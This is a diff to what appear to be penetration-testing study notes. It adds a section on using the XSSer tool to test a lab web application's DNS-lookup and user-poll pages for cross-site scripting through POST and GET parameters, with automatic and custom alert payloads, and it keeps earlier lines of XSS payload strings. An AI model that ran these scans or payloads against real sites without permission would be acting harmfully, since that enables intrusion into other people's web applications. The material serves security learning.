@@ -46,4 +46,19 @@ a';alert(888);//
 a';alert(888);'
 /"><script>alert(888)</script>
 ```
-  
+
+## xsser
+- POST
+  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'```
+    - XSSer will substitute payload in place of "XSS" string
+    - ```p``` shows parameter in POST request (intercept request and copy parameter values from Burp) 
+  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto```
+    - Trying various XSS payloads by using XSSer's ```--auto``` option
+  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"```
+    - Using custom XSS payload 
+- GET
+  - ```xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote"```
+  - ```xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"```
+ 
+ 
+ - 
